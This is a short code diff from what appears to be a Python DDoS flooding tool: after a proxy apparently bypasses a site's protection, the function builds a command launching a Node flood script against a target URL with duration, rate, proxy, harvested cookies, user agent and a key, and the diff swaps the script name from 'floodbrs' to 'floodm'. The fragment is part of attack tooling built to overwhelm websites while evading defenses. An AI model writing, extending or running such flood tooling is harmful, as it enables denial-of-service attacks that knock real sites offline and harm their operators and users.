@@ -464,7 +464,7 @@ def solve(proxy_add, url, duration, rate, port, optional_args):
                     print(f"[SUCCESS] Proxy: {proxy_add} bypassed successfully!")
                     print(formatted_data)
                     flood_command = [
-                        'node', 'floodbrs', url, str(duration), '35', proxy_add, str(rate),
+                        'node', 'floodm', url, str(duration), '35', proxy_add, str(rate),
                         cookies, user_agent, validkey
                     ]
                     sanitized_optional_args = sanitize_optional_args(optional_args)
